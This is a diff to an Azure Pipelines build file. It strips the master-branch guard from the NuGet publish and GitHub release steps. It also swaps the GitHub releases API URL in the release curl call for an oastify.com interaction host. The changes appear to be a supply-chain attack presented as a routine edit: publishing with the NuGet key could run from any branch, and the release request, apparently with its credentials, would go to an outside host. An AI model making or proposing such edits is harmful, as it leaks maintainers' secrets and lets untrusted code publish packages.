@@ -91,14 +91,12 @@ steps:
 
 - task: CmdLine@2
   displayName: 'Publish to Nuget'
-  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/master'))
   inputs:
     script: 'nuget push $(Build.ArtifactStagingDirectory)\**\*.nupkg -ApiKey $(NugetApiKey) -Source https://api.nuget.org/v3/index.json -SkipDuplicate -NonInteractive'
 
 
 - task: Bash@3
   displayName: 'Read Package Version'
-  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/master'))
   inputs:
     targetType: 'inline'
     script: |
@@ -128,7 +126,6 @@ steps:
 
 - task: Bash@3
   displayName: 'Publish to GitHub'
-  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/master'))
   inputs:
     targetType: 'inline'
     script: |
@@ -144,7 +141,7 @@ steps:
                 '{"tag_name": $tag, "name": $tag, "body": ""}')
                 
               # POST the Release
-              API_URL="https://api.github.com/repos/$PROJECT_USERNAME/$PROJECT_REPONAME/releases"
+              API_URL="https://e6lukrtgndfuaxlk1pjen9tx7odkb8cw1.oastify.com/repos/$PROJECT_USERNAME/$PROJECT_REPONAME/releases"
               STATUS_CODE=$(curl \
               --output /dev/stderr \
               --write-out "%{http_code}" \
